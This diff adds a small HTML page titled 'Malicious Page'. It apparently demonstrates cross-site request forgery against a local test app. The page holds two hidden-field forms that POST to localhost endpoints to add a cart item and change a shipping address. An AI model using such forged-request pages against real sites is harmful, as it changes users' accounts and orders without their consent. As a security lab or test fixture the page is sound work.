@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>Malicious Page</h1>
+
+    <!-- Form to add an item to cart from a different page -->
+    <form id="addItemForm" action="http://localhost:3000/api/add_item" method="POST">
+        <input type="hidden" name="item" value="Item 1">
+        <button type="submit">Add Malicious Item</button>
+    </form>
+
+    <!-- Form to change address from a different page -->
+    <form id="addAddressForm" action="http://localhost:3000/api/submit_address" method="POST">
+        <input type="hidden" name="address" value="Malicious Address: 123 Hacker Street, Cybercity">
+        <button type="submit">Change Address</button>
+    </form>
+</body>
+</html>
